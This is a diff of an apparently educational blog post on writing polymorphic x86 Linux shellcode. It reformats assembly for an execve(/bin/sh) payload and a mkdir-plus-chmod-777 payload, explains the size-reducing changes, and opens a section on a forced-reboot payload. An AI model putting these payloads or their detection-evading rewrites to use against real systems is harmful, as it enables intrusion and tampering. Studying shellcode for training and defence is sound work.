@@ -27,22 +27,22 @@ Now that we know what is polymorphic shellcode and how it is useful for us, let'
 ## First polymorphic shellcode - execve(/bin/sh)
 [Here](http://shell-storm.org/shellcode/files/shellcode-827.php) is the link to the original shellcode.
 
-Original shellcode:
+Original assembly source:
 
 ```nasm
-xor    eax, eax
-push   eax
-push   0x68732f2f
-push   0x6e69622f
-mov    ebx, esp
-push   eax
-push   ebx
-mov    ecx, esp
-mov    al, 0x0b
-int    0x80
+xor eax, eax
+push eax
+push dword 0x68732f2f
+push dword 0x6e69622f
+mov ebx, esp
+push eax
+push ebx
+mov ecx, esp
+mov al, 0x0b
+int 0x80
 ```
 
-Polymorphic shellcode:
+Polymorphic assembly source:
 
 ```nasm
 xor eax, eax           ; Clearing out EAX register
@@ -73,25 +73,25 @@ Let's see a demo of the shellcode in action now:
 ## Second polymorphic shellcode - create dir + chmod 777 + exit
 [Here](https://www.exploit-db.com/exploits/37358) is the link to the original shellcode.
 
-Original shellcode:
+Original assembly source:
 
 ```nasm
-xor    eax, eax
-push   eax
-push   0x4b434148  #You can change it !
-mov    al, 0x27
-mov    ebx, esp
-inc    cx
-int    0x80
-mov    al, 0xf
-mov    cx, 0x1ff
-int    0x80
-xor    eax, eax
-inc    eax
-int    0x80
+xor eax, eax
+push eax
+push dword 0x4b434148  #You can change it !
+mov al, 0x27
+mov ebx, esp
+inc cx
+int 0x80
+mov al, 0xf
+mov cx, 0x1ff
+int 0x80
+xor eax, eax
+inc eax
+int 0x80
 ```
 
-Polymorphic shellcode:
+Polymorphic assembly source:
 
 ```nasm
 xor eax, eax                             ; Clearing out EAX register
@@ -112,6 +112,21 @@ Length of original shellcode: `29 bytes`
 Length of polymorphic shellcode: `25 bytes`
 
 Size Reduction: `14%`
+
+This is a shellcode which will create a directory named "HACK"(modifiable), set the permission of the directory to 777 using chmod and then exit gracefully.
+
+The modifications made for creating the polymorphic shellcode are as follows:
+
+1. Removed the XOR'ing of EAX for the exit syscall because we don't really need that.
+1. Removed the INC of CX by 1 before syscall of mkdir because again it is unnecessary in this scenario.
+
+There isn't much left to further decrease the size but hey we did decrease it by 14%.
+
+Let's see a demo of the shellcode in action now:
+
+<script id="asciicast-rhGNnD45lsmXLIXTluTbKOB49" src="https://asciinema.org/a/rhGNnD45lsmXLIXTluTbKOB49.js" async></script>
+
+## Third polymorphic shellcode - force system reboot 
 
 
 
